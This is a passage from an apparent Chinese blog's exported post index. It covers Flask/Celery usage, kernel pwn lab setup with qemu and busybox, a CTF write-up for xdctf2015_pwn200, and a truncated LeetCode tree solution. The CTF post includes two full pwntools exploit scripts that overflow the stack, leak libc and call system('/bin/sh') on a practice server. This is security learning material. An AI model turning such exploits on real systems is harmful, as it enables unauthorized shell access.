jsonify(res.wait())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@th.get(<span class="params"><span class="string">&#x27;/msgs&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">msg_list</span>():</span><br><span class="line">    messages = Message.query.<span class="built_in">all</span>()</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> message <span class="keyword">in</span> messages:</span><br><span class="line">        results.append(message.to_json())</span><br><span class="line">    <span class="keyword">return</span> jsonify(results)</span><br></pre></td></tr></table></figure><p>celery 的任务可以通过 delay， 方法调用，参数在 delay 中直接传入。</p><p>详细介绍：</p><h4 id="celery文档"><a class="markdownIt-Anchor" href="#celery文档">#</a> celery 文档<a href="https://www.cnblogs.com/wxhou/p/14399237.html#celery%E6%96%87%E6%A1%A3">#</a></h4><p>这些 API 定义了标准的执行选项集，也就是下面这三个方法：</p><ul><li><p>apply_async(args[, kwargs[, …]])</p><p>发送一个任务消息。</p></li><li><p>delay(*args, **kwargs)</p><p>直接发送一个任务消息，但是不支持运行参数。</p></li><li><p>calling( <code>__call__</code> )</p><p>应用一个支持调用接口（例如，add (2,2)）的对象，意味着任务不会被一个 worker 执行，但是会在当前线程中执行 (但是消息不会被发送)。</p></li></ul><p><strong>速查表</strong></p><ul><li><p><code>T.delay(arg, kwarg=value)</code></p><p>调用 apply_async 的快捷方式（.delay (_args, *_kwargs) 等价于调用 .apply_async (args, kwargs)）。</p></li><li><p><code>T.apply_async((arg,), &#123;'kwarg': value&#125;)</code></p></li><li><p><code>T.apply_async(countdown=10)</code></p><p>从现在起，十秒内执行。</p></li><li><p><code>T.apply_async(eta=now + timedelta(seconds=10))</code></p><p>从现在起十秒内执行，指明使用 eta。</p></li><li><p><code>T.apply_async(countdown=60, expires=120)</code></p><p>从现在起一分钟执行，但在两分钟后过期。</p></li><li><p><code>T.apply_async(expires=now + timedelta(days=2))</code></p><p>两天内过期，使用 datetime 对象。</p></li></ul><p>例子</p><p><code>delay()</code>  方法就像一个很规则的函数，很方便去调用它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task.delay(arg1, arg2, kwarg1=<span class="string">&#x27;x&#x27;</span>, kwarg2=<span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用  <code>apply_async()</code>  替代你写的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task.apply_async(args=[arg1, arg2], kwargs=&#123;<span class="string">&#x27;kwarg1&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;kwarg2&#x27;</span>: <span class="string">&#x27;y&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>尽管运行十分方便，但是如果像设置额外的行参数，你必须用  <code>apply_async</code></p><h4 id="运行一下"><a class="markdownIt-Anchor" href="#运行一下">#</a> 运行一下<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%8B">#</a></h4><p>运行之前我们需要先创建一个 <code>.flaskenv</code>  文件，指定以下我们的 FLASK_APP 环境变量是 server.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLASK_APP=server.py</span><br></pre></td></tr></table></figure><p>好了之后，启动 flask</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure><p>启动 celery</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A server.my_celery worker -l info -P eventlet</span><br></pre></td></tr></table></figure><p>老规矩，看一下任务注册成功没</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[tasks]</span><br><span class="line">  . app.tasks.add2</span><br></pre></td></tr></table></figure><p>我们打开浏览器查看</p><p><a href="https://i.loli.net/2021/08/21/wryXGlcC1kn58Vh.png"><img src="https://i.loli.net/2021/08/21/wryXGlcC1kn58Vh.png" alt="image"></a></p><p>可以看到执行成功了。再看看命令行。</p><p><a href="https://i.loli.net/2021/08/21/8FDZyo3A41UaVbR.png"><img src="https://i.loli.net/2021/08/21/8FDZyo3A41UaVbR.png" alt="image-20210821235926547"></a></p><p>任务已经成功的执行了。</p><p>就这样我们弄好了 flask+celery 项目的配置，并成功执行了任务。</p><p>（待补充 django+celery)</p>]]></content>
      
      
      <categories>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn 学习（一）</title>
      <link href="/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>kernel pwn 环境搭建</p><span id="more"></span><h2 id="编译内核"><a class="markdownIt-Anchor" href="#编译内核">#</a> 编译内核</h2><p>首先到 linux 内核<a href="https://www.kernel.org/">官网</a>下载一份内核源代码并解压</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092301097.png" alt="image-20220209230147843"></p><p>选择一个版本下载，我选的是 4.9 [tallball]，</p><p>之后安装需要的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc</span><br></pre></td></tr></table></figure><p>解压源码后进入内核目录，输入命令 sudo make menuconfig 进入内核设置</p><p><img src="https://n0va-scy.github.io/images/%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.jpg" alt="img"></p><p>进入 kernel hacking，检查保证勾选了以下选项 (其实默认都是勾选的，只是进去看一眼而已)</p><ul><li>Kernel debugging</li><li>Compile-time checks and compiler options —&gt; Compile the kernel with debug info 和 Compile the kernel with frame pointers</li><li>KGDB: kernel debugger</li></ul><p>保存并退出</p><p><code>sudo make bzImage</code>  生成 bzImage，过程挺久的，完成后在 boot 下生成了一个 bzImage 文件</p><blockquote><p>注:</p><p>在过程中可能报错 <code>没有规则可制作目标debian/certs/debian-uefi-certs.pem由certs/x509_certificate_list需求停止</code></p><p>解决方法：在主目录 /usr/src/linux… 中修改.config 文件，去掉上述内容（如果还是不行就修改 linux.4.9 中的.config 对应部分为空<img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092308620.png" alt="image-20220209230842570"></p><p>重新编译即可</p></blockquote><h2 id="编译busybox构建文件系统"><a class="markdownIt-Anchor" href="#编译busybox构建文件系统">#</a> 编译 busybox 构建文件系统</h2><p>在<a href="https://busybox.net/"> busybox 官网</a>下载 busybox 文件，最新版的就行</p><p>解压后进入目录， <code>make menuconfig</code> ，同样会进入图形界面，在 Settings 上勾选 Build static binary (no shared libs), 然后保存退出</p><p>编译，执行 <code>make install</code> ，根目录下会生成一个 <code>_install</code>  文件夹，进入文件夹配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">touch packet</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure><p>编辑 init 文件，用于内核初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">#mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。</span><br><span class="line"># insmod /xxx.ko # 加载模块</span><br><span class="line"># insmod /hello.ko # 加载hello.ko模块</span><br><span class="line">mdev -s </span><br><span class="line"># We need this to find /dev/sda later</span><br><span class="line">echo -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line"># exec /bin/sh #root</span><br></pre></td></tr></table></figure><p>几个常见指令</p><ul><li>insmod: 指定模块加载到内核中</li><li>rmmod: 从内核中卸载指定模块</li><li>lsmod: 列出已经加载的模块</li></ul><p>在 packet 中写入，用于将 FileSystem 打包成映像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.img</span><br></pre></td></tr></table></figure><p>运行 packet 将得到 rootfs.img 文件</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092315957.png" alt="image-20220209231518652"></p><h2 id="运行内核"><a class="markdownIt-Anchor" href="#运行内核">#</a> 运行内核</h2><p>安装 qemu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装QEMU的依赖库</span><br><span class="line">sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev</span><br><span class="line">sudo apt-get install qemu</span><br><span class="line">测试输入qemu + tab 如果有很多实例回显，就说明安装成功</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092316280.png" alt="image-20220209231643002"></p><p>之后写一个 shell 脚本启动 qemu, 将前面生成的 bzImage,rootfs.img 一起放到_install 文件夹下，<a href="http://xn--boot-k55ll68a.sh">运行 boot.sh</a>，结果如下</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092319697.png" alt="image-20220209231910444"></p><blockquote><p>如果显示权限不够则 chmod +x boot.sh 并在 root 下运行即可</p></blockquote><p>shell 中参数的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-m 是指定RMA大小(默认384)</span><br><span class="line">-kernel 是指定的内核镜像，这里是我们编译的镜像路径，也可以是我们下载好的镜像，如./vmlinuz-4.10.0-1004-gcp</span><br><span class="line">-initrd 设置刚刚利用 busybox 创建的 rootfs.img,作为内核启动的文件系统 </span><br><span class="line">-append 附加选项，指定no kaslr 可以关闭随机偏移</span><br><span class="line">--nographic和console=ttyS0一起使用，启动的界面就变成了当前终端</span><br><span class="line">-s 相当于-gdb tcp::1234的简写，可以直接通过主机的gdb远程连接</span><br><span class="line">-monitor 配置用户械的网络 // 将监视器重定向主机设备 /dev/null</span><br><span class="line">-smp 用于生明所以可能用的cps,ie,socket cores threads = maxcputs.</span><br><span class="line">-cpu 设置cpu的安全选项</span><br></pre></td></tr></table></figure><p>到这里也说明了为什么 kernel pwn 题目一般都会给出这 3 个文件 <code>.sh ,bzImage,rootfs.cpio</code> ，分别是启动脚本，kernel 镜像以及文件系统映像</p><p>一般来说 kernel pwn 里面，漏洞通常是出现在 ko 文件，也就是模块文件，驱动 文件中，而 kernel pwn 的最终目标一般是提权，拿到 root 才能读取 flag</p><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/qq_40827990/article/details/97036109">https://blog.csdn.net/qq_40827990/article/details/97036109</a></p><p><a href="https://n0va-scy.github.io/2020/06/21/kernel%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">https://n0va-scy.github.io/2020/06/21/kernel pwn 环境搭建 /</a></p>]]></content>
      
      
      <categories>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xdctf2015_pwn200</title>
      <link href="/2022/02/01/xdctf2015_pwn200/"/>
      <url>/2022/02/01/xdctf2015_pwn200/</url>
      
        <content type="html"><![CDATA[<p>DynELF 使用</p><span id="more"></span><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p>程序检查：32 位程序</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202012038510.png" alt="image-20220201203856459"></p><p>主函数：vul 中存在栈溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202012037448.png" alt="image-20220201203754291"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202012039002.png" alt="image-20220201203927851"></p><h2 id="关于dynelf"><a class="markdownIt-Anchor" href="#关于dynelf">#</a> 关于 DynELF</h2><p>​在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 <a href="http://libc.so">libc.so</a> 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 <a href="http://libc.so">libc.so</a>，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。</p><p>​官方文档里给出了下面的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 DynELF，首先需要有一个  <code>leak(address)</code>  函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用  <code>d = DynELF(leak, main)</code> ，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2><p>第一次栈溢出 write 函数泄露 libc 地址，返回 main 函数，使用 DynELF 查找 system 地址写入 /bin/sh，再次 rop 执行拿到 shell</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25224</span>)</span><br><span class="line"><span class="comment"># r= process(&#x27;./bof&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x804851c</span></span><br><span class="line">bss_addr=elf.symbols[<span class="string">&#x27;__bss_start&#x27;</span>] </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>)://write函数泄露libc地址</span><br><span class="line">        r.recvline()</span><br><span class="line">        payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">0x4</span>)</span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        leak_addr=r.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">&#x27;./bof&#x27;</span>))</span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(read_addr)+p32(main_addr)+p32(<span class="number">0x0</span>)+p32(bss_addr)+p32(<span class="number">0x8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)  <span class="comment"># 通过read函数读入/bin/sh到bss段</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+p32(main_addr)+p32(bss_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>法二 : ret2dl-resolve</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23x86.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">112</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(sh.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) <span class="comment">#获取write函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="number">112</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode数据结构刷题（二）</title>
      <link href="/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>二叉搜索树相关</p><span id="more"></span><h2 id="0x01-二叉树最底层最左边的值"><a class="markdownIt-Anchor" href="#0x01-二叉树最底层最左边的值">#</a> 0x01 二叉树最底层最左边的值</h2><p>给定一个二叉树的 <strong>根节点</strong>  <code>root</code> ，请找出该二叉树的 <strong>最底层 最左边</strong> 节点的值。</p><p>假设二叉树中至少有一个节点。</p><p><img src="https://assets.leetcode.com/uploads/2020/12/14/tree2.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,2,3,4,null,5,6,null,null,7]</span><br><span class="line">输出: 7</span><br></pre></td></tr></table></figure><h3 id="法一前序遍历dfs"><a class="markdownIt-Anchor" href="#法一前序遍历dfs">#</a> 法一：前序遍历 DFS</h3><p>使用 DFS 递归遍历树的所有节点，记录当前节点的层级 level 与已遍历节点的最大层级 maxLevel<br> 每当 level 超过 maxLevel 时，将当前节点赋值给 res，另外更新 maxLevel<br> 遍历完成后，res 就是要找的节点，返回该节点的值即可</p><p>遍历到新的一层的第一个节点为最底层，最左边的节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxlevel=<span class="number">-1</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">     <span class="built_in">dfs</span>(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode * root,<span class="type">int</span> level)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span>(level&gt;maxlevel)&#123;</span><br><span class="line">            res = root-&gt;val;</span><br><span class="line">            maxlevel = level;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;left,level+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;right,level+<span class="number">1</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法二层序遍历bfs"><a class="markdownIt-Anchor" href="#法二层序遍历bfs">#</a> 法二：层序遍历 BFS</h3><p>更新每层第一个元素值，取最后一次更新值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) 